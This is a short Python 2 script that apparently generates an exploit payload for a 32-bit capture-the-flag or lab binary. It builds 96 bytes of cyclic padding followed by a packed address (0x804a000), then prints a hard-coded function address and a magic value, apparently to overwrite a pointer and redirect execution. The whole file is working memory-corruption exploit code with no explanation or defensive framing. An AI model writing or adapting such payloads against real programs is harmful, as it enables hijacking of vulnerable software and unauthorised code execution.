import string
import struct
from functools import partial


p32 = partial(struct.pack, "<I")


def b(l, b):
    return "".join([string.ascii_letters[i % len(string.ascii_letters)] * b for i in range(l / b)])


def main():
    print b(96, 4) + p32(0x804a000)
    print "%i" % 0x080485d7
    print 13371337


if __name__ == '__main__':
    main()
